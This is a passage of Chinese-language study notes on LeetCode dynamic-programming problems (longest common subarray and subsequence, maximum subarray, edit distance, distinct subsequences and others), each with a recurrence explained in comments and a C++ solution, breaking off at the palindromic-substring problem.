            dp[i][j] = dp[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">                res = <span class="built_in">max</span>(res,dp[i][j]);<span class="comment">//更新</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dp[i][j]直接表示以nums[i]和nums[j]结尾的...</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findLength</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span> (nums1.<span class="built_in">size</span>() + <span class="number">1</span>, vector&lt;<span class="keyword">int</span>&gt;(nums2.<span class="built_in">size</span>() + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 要对第一行，第一列经行初始化</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums1.<span class="built_in">size</span>(); i++) <span class="keyword">if</span> (nums1[i] == nums2[<span class="number">0</span>]) dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; nums2.<span class="built_in">size</span>(); j++) <span class="keyword">if</span> (nums1[<span class="number">0</span>] == nums2[j]) dp[<span class="number">0</span>][j] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums1.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; nums2.<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums1[i] == nums2[j] &amp;&amp; i&gt;<span class="number">0</span> &amp;&amp; j&gt;<span class="number">0</span>) &#123; <span class="comment">// 防止 i-1 出现负数</span></span><br><span class="line">                    dp[i][j] = dp[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (dp[i][j] &gt; result) result=dp[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="1143-最长公共子序列——两个字符串-非连续子序列"><a href="#1143-最长公共子序列——两个字符串-非连续子序列" class="headerlink" title="1143 最长公共子序列——两个字符串-非连续子序列"></a>1143 最长公共子序列——两个字符串-非连续子序列</h3><p>给定两个字符串 text1 和 text2，返回这两个字符串的【最长公共子序列的长度】。如果不存在 公共子序列，返回 0 。<br><strong>【字符串的子序列】</strong>：由原字符串在不改变字符的相对顺序的情况下删除某些字符（也可以不删除任何字符）后组成的新字符串。</p><pre><code>例如，&quot;ace&quot; 是 &quot;abcde&quot; 的子序列，但 &quot;aec&quot; 不是 &quot;abcde&quot; 的子序列。输入：text1 = &quot;abcde&quot;, text2 = &quot;ace&quot; 输出：3  解释：最长公共子序列是 &quot;ace&quot; ，它的长度为 3 。</code></pre><p><strong>与上一题的区别：本题不要求【连续】</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i][j]以[0,i-1]的nums1[i]数组 和 以[0,j-1]的nums2[j]数组 的最长公共子序列长度</span></span><br><span class="line"><span class="comment">    区别：</span></span><br><span class="line"><span class="comment">    if(nums1[i-1]==nums2[j-1])</span></span><br><span class="line"><span class="comment">        dp[i][j]=dp[i-1][j-1]+1;</span></span><br><span class="line"><span class="comment">    else</span></span><br><span class="line"><span class="comment">        dp[i][j]=max(dp[i-1][j],dp[i][j-1]);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">longestCommonSubsequence</span><span class="params">(string text1, string text2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m=text1.<span class="built_in">size</span>(),n=text2.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(m+<span class="number">1</span>,vector&lt;<span class="keyword">int</span>&gt;(n+<span class="number">1</span>,<span class="number">0</span>));<span class="comment">//初始0</span></span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(text1[i<span class="number">-1</span>]==text2[j<span class="number">-1</span>])</span><br><span class="line">                    dp[i][j] = dp[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>,dp[i][j];</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    dp[i][j] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i][j<span class="number">-1</span>]);<span class="comment">//重点！！！</span></span><br><span class="line">                res = <span class="built_in">max</span>(res,dp[i][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="1035-不相交的线——最长公共子序列"><a href="#1035-不相交的线——最长公共子序列" class="headerlink" title="1035 不相交的线——最长公共子序列"></a>1035 不相交的线——最长公共子序列</h3><p>在两条独立的水平线上按给定的顺序写下 nums1 和 nums2 中的整数。<br>现在，可以绘制一些连接两个数字 nums1[i] 和 nums2[j] 的直线，这些直线需要同时满足满足：</p><pre><code> nums1[i] == nums2[j]且绘制的直线不与任何其他连线（非水平线）相交。</code></pre><p>请注意，连线即使在端点也不能相交：每个数字只能属于一条连线。<br>以这种方法绘制线条，并返回可以绘制的【最大连线数】。<br><img src="https://img-blog.csdnimg.cn/46cfa198235f489ca3b7786b4867c4a9.png"><br><strong>和上一题一样</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i][j]以nums1[i-1]和nums2[j-1]为结尾的两个数组，最大连线数</span></span><br><span class="line"><span class="comment">    if(nums1[i-1]==nums2[j-1])</span></span><br><span class="line"><span class="comment">        dp[i][j]=dp[i-1][j-1]+1;</span></span><br><span class="line"><span class="comment">    else</span></span><br><span class="line"><span class="comment">        dp[i][j]=max(dp[i-1][j],dp[i][j-1]);</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="53-最大子数组和——连续子序列-和"><a href="#53-最大子数组和——连续子序列-和" class="headerlink" title="53 最大子数组和——连续子序列+和"></a>53 最大子数组和——连续子序列+和</h3><p>给你一个整数数组 nums ，请你找出一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。<br>子数组 是数组中的一个连续部分。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i]以nums[i]结尾【包括nums[i]】的 最大子数组和</span></span><br><span class="line"><span class="comment">    误区：dp[i] = max(dp[i-1],dp[i-1]+nums[i]);</span></span><br><span class="line"><span class="comment">    正解：dp[i] = max(nums[i],dp[i-1]+nums[i]);</span></span><br><span class="line"><span class="comment">    关键：</span></span><br><span class="line"><span class="comment">        在于【以nums[i]结尾】，要么以nums[i]结尾只包含一个元素即nums[i]，要么包含很多元素，起始位置在nums[i]前某元素开始。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxSubArray</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n,<span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> res = nums[<span class="number">0</span>];<span class="comment">//记录结果</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;<span class="comment">//从1开始</span></span><br><span class="line">            dp[i] = <span class="built_in">max</span>(nums[i],dp[i<span class="number">-1</span>]+nums[i]);</span><br><span class="line">            res = <span class="built_in">max</span>(res,dp[i]);<span class="comment">//更新</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">            cout&lt;&lt;dp[i]&lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        cout &lt;&lt;endl;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="392-判断子序列——字符串-不连续"><a href="#392-判断子序列——字符串-不连续" class="headerlink" title="392 判断子序列——字符串-不连续"></a>392 判断子序列——字符串-不连续</h3><p>给定字符串 s 和 t ，判断 s 是否为 t 的子序列。<br>字符串的一个子序列是原始字符串删除一些（也可以不删除）字符而不改变剩余字符相对位置形成的新字符串。（例如，”ace”是”abcde”的一个子序列，而”aec”不是）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//双指针</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isSubsequence</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> n = t.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(m==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">int</span> l1 = <span class="number">0</span>, l2 = <span class="number">0</span>, count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(l1&lt;m &amp;&amp; l2&lt;n)&#123;</span><br><span class="line">            <span class="keyword">char</span> c = s[l1];</span><br><span class="line">            <span class="keyword">if</span>(c==t[l2])&#123;</span><br><span class="line">                l1++;</span><br><span class="line">                l2++;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;<span class="keyword">else</span></span><br><span class="line">                l2++;</span><br><span class="line">            <span class="keyword">if</span>(count==m)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//最长公共子序列</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isSubsequence</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m=s.<span class="built_in">size</span>(),n=t.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(m+<span class="number">1</span>,vector&lt;<span class="keyword">int</span>&gt;(n+<span class="number">1</span>,<span class="number">0</span>));<span class="comment">//初始0</span></span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(s[i<span class="number">-1</span>]==t[j<span class="number">-1</span>])</span><br><span class="line">                    dp[i][j] = dp[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>,dp[i][j];</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    dp[i][j] = dp[i][j<span class="number">-1</span>];<span class="comment">//注意！</span></span><br><span class="line">                    <span class="comment">//dp[i][j] = max(dp[i-1][j],dp[i][j-1]);//重点！！！</span></span><br><span class="line">                res = <span class="built_in">max</span>(res,dp[i][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res==m;<span class="comment">//若最长公共子序列-不连续 的长度==m</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/1e99b483795b48ae859034c4b4a5351a.png"></p><h3 id="115-不同的子序列——相同-不连续子序列个数-删除元素"><a href="#115-不同的子序列——相同-不连续子序列个数-删除元素" class="headerlink" title="115 不同的子序列——相同-不连续子序列个数[删除元素]"></a>115 不同的子序列——相同-不连续子序列个数[删除元素]</h3><p>给你两个字符串 s 和 t ，统计并返回在 s 的 子序列 中 t 出现的个数。</p><pre><code>输入：s = &quot;rabbbit&quot;, t = &quot;rabbit&quot;输出：3rab  itra b itra  bit</code></pre><p><strong>注意</strong>：一种思路是考虑删除s中的元素，而得到字符串t，【删除的不同情况个数】，即s中包含t的不同子序列个数。<br>这样的话，考虑把s中所有元素都删除，也就是说，s中包括空字符串””的个数是1。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i][j]以s[i-1]结尾的字符串中 含有 以t[j-1]为结尾的字符串 的个数。</span></span><br><span class="line"><span class="comment">    初始化：</span></span><br><span class="line"><span class="comment">        dp[i][0]=1; dp[0][j]=0; dp[0][0]=1;</span></span><br><span class="line"><span class="comment">    if(s[i-1]==t[j-1])</span></span><br><span class="line"><span class="comment">        dp[i][j] = dp[i-1][j-1]+dp[i-1][j]; //这里！！ </span></span><br><span class="line"><span class="comment">    else</span></span><br><span class="line"><span class="comment">        dp[i][j] = dp[i-1][j];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numDistinct</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m=s.<span class="built_in">size</span>(),n=t.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">uint64_t</span>&gt;&gt; <span class="built_in">dp</span>(m+<span class="number">1</span>,vector&lt;<span class="keyword">uint64_t</span>&gt;(n+<span class="number">1</span>,<span class="number">0</span>));<span class="comment">//初始0</span></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=m;i++)</span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">            dp[<span class="number">0</span>][i] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(s[i<span class="number">-1</span>]==t[j<span class="number">-1</span>])</span><br><span class="line">                    dp[i][j] = dp[i<span class="number">-1</span>][j<span class="number">-1</span>]+dp[i<span class="number">-1</span>][j];</span><br><span class="line">                    <span class="comment">//这里！！！</span></span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    dp[i][j] = dp[i<span class="number">-1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="583-两个字符串的删除操作"><a href="#583-两个字符串的删除操作" class="headerlink" title="583 两个字符串的删除操作"></a>583 两个字符串的删除操作</h3><p>给定两个单词 word1 和 word2，找到【使得 word1 和 word2 相同所需的最小步数】，每步可以删除任意一个字符串中的一个字符。<br>示例：</p><pre><code>输入: &quot;sea&quot;, &quot;eat&quot;输出: 2解释: 第一步将&quot;sea&quot;变为&quot;ea&quot;，第二步将&quot;eat&quot;变为&quot;ea&quot;</code></pre><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i][j]以word1[i-1]和word2[j-1]为结尾的两个字符串 相同所需要删除的最小次数。</span></span><br><span class="line"><span class="comment">    if(word1[i-1]==word2[j-1])</span></span><br><span class="line"><span class="comment">        dp[i][j]=dp[i-1][j-1];</span></span><br><span class="line"><span class="comment">    else</span></span><br><span class="line"><span class="comment">        dp[i][j]=min(dp[i-1][j]+1,dp[i][j-1]+1,dp[i-1][j-1]+2);</span></span><br><span class="line"><span class="comment">    初始化：</span></span><br><span class="line"><span class="comment">        dp[i][0] = i;</span></span><br><span class="line"><span class="comment">        dp[0][j] = j;</span></span><br><span class="line"><span class="comment">        dp[0][0] = 0;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minDistance</span><span class="params">(string word1, string word2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = word1.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> n = word2.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(m+<span class="number">1</span>,vector&lt;<span class="keyword">int</span>&gt;(n+<span class="number">1</span>,<span class="number">0</span>));</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=m;i++)</span><br><span class="line">            dp[i][<span class="number">0</span>] = i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=n;j++)</span><br><span class="line">            dp[<span class="number">0</span>][j] = j;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(word1[i<span class="number">-1</span>]==word2[j<span class="number">-1</span>])</span><br><span class="line">                    dp[i][j]=dp[i<span class="number">-1</span>][j<span class="number">-1</span>];</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    dp[i][j]=<span class="built_in">min</span>(dp[i<span class="number">-1</span>][j]+<span class="number">1</span>,dp[i][j<span class="number">-1</span>]+<span class="number">1</span>);</span><br><span class="line">                     <span class="comment">//dp[i-1][j-1]+2</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="72-编辑距离"><a href="#72-编辑距离" class="headerlink" title="72 编辑距离"></a>72 编辑距离</h3><p>给你两个单词 word1 和 word2，请你计算出【将 word1 转换成 word2 所使用的最少操作数】。</p><p><strong>可以对一个单词进行如下三种操作</strong>：</p><ul><li><strong>插入</strong>一个字符</li><li><strong>删除</strong>一个字符</li><li><strong>替换</strong>一个字符</li></ul><p><strong>注意：可视【删除】和【插入】效果一致</strong></p><p>示例 1：<br>    输入：word1 = “horse”, word2 = “ros”<br>    输出：3<br>    解释： horse -&gt; rorse (将 ‘h’ 替换为 ‘r’) rorse -&gt; rose (删除 ‘r’) rose -&gt; ros (删除 ‘e’)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划 </span></span><br><span class="line"><span class="comment">    dp[i][j]以word1[i-1]和word2[j-1]为结尾的两个字符串进行操作后相等 的最小操作数。</span></span><br><span class="line"><span class="comment">    if(word1[i-1]==word2[j-1])</span></span><br><span class="line"><span class="comment">        dp[i][j]=dp[i-1][j-1];</span></span><br><span class="line"><span class="comment">    else</span></span><br><span class="line"><span class="comment">        dp[i][j]=min(dp[i-1][j]+1,dp[i][j-1]+1,dp[i-1][j-1]+1);</span></span><br><span class="line"><span class="comment">    初始化：</span></span><br><span class="line"><span class="comment">        dp[0][0]=0; dp[i][0]=i; dp[0][j]=j;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minDistance</span><span class="params">(string word1, string word2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = word1.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> n = word2.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(m+<span class="number">1</span>,vector&lt;<span class="keyword">int</span>&gt;(n+<span class="number">1</span>,<span class="number">0</span>));</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">0</span>; </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=m;i++)</span><br><span class="line">            dp[i][<span class="number">0</span>] = i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">            dp[<span class="number">0</span>][j] = j;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">                <span class="keyword">if</span>(word1[i<span class="number">-1</span>]==word2[j<span class="number">-1</span>])</span><br><span class="line">                    dp[i][j]=dp[i<span class="number">-1</span>][j<span class="number">-1</span>];</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    dp[i][j]=<span class="built_in">min</span>(<span class="built_in">min</span>(dp[i<span class="number">-1</span>][j]+<span class="number">1</span>,dp[i][j<span class="number">-1</span>]+<span class="number">1</span>),dp[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="647-回文子串"><a href="#647-回文子串" class="headerlink" title="647 回文子串"></a>647 回文子串</h3><p>给你一个字符串 s ，请你统计并返回【这个字符串中 回文子串 的数目】。<br><strong>回文字符串</strong> 是正着读和倒过来读一样的字符串。<br><strong>子字符串</strong> 